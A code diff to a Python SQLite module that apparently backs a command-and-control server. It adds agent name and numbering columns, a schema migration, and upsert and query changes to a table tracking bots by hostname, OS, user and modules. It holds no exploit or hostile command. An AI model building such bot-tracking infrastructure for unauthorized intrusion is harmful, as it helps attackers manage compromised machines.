@@ -45,6 +45,8 @@ def init_db():
 
     CREATE TABLE IF NOT EXISTS bots (
         bot_id TEXT PRIMARY KEY,
+        agent_name TEXT,
+        meepo_num INTEGER,
         hostname TEXT,
         os TEXT,
         user TEXT,
@@ -53,8 +55,28 @@ def init_db():
         last_seen REAL
     );
     """)
+
+    # Миграция: если таблица bots уже была без новых колонок — добавим
+    _migrate_bots_columns()
+
     _conn.commit()
     print(f"[+] DB initialized: {DB_PATH}")
+
+
+def _migrate_bots_columns():
+    """Добавляет agent_name и meepo_num, если их нет (для существующих баз)."""
+    if _conn is None:
+        return
+    try:
+        cols = {r["name"] for r in _conn.execute("PRAGMA table_info(bots)").fetchall()}
+        if "agent_name" not in cols:
+            _conn.execute("ALTER TABLE bots ADD COLUMN agent_name TEXT")
+            print("[+] migration: added bots.agent_name")
+        if "meepo_num" not in cols:
+            _conn.execute("ALTER TABLE bots ADD COLUMN meepo_num INTEGER")
+            print("[+] migration: added bots.meepo_num")
+    except Exception as e:
+        print(f"[!] migration error: {e}")
 
 
 def save_task(t: dict):
@@ -101,9 +123,12 @@ def save_bot(b: dict):
         return
     try:
         _conn.execute("""
-            INSERT INTO bots (bot_id, hostname, os, user, modules, first_seen, last_seen)
-            VALUES (?, ?, ?, ?, ?, ?, ?)
+            INSERT INTO bots (bot_id, agent_name, meepo_num, hostname, os, user,
+                              modules, first_seen, last_seen)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
             ON CONFLICT(bot_id) DO UPDATE SET
+                agent_name=excluded.agent_name,
+                meepo_num=excluded.meepo_num,
                 hostname=excluded.hostname,
                 os=excluded.os,
                 user=excluded.user,
@@ -111,6 +136,8 @@ def save_bot(b: dict):
                 last_seen=excluded.last_seen
         """, (
             b["bot_id"],
+            b.get("agent_name"),
+            b.get("meepo_num"),
             b.get("hostname"),
             b.get("info", {}).get("os"),
             b.get("info", {}).get("user"),
@@ -121,6 +148,18 @@ def save_bot(b: dict):
         _conn.commit()
     except Exception as e:
         print(f"[!] save_bot error: {e}")
+
+
+def max_meepo_num() -> int:
+    """Максимальный номер Meepo в базе (0, если пусто)."""
+    if _conn is None:
+        return 0
+    try:
+        row = _conn.execute("SELECT COALESCE(MAX(meepo_num), 0) AS m FROM bots").fetchone()
+        return int(row["m"] or 0)
+    except Exception as e:
+        print(f"[!] max_meepo_num error: {e}")
+        return 0
 
 
 def load_all_tasks() -> List[dict]:
@@ -162,6 +201,8 @@ def load_all_bots() -> List[dict]:
         for r in rows:
             out.append({
                 "bot_id": r["bot_id"],
+                "agent_name": r["agent_name"],
+                "meepo_num": r["meepo_num"],
                 "hostname": r["hostname"],
                 "info": {"os": r["os"], "user": r["user"]},
                 "modules": json.loads(r["modules"]) if r["modules"] else [],
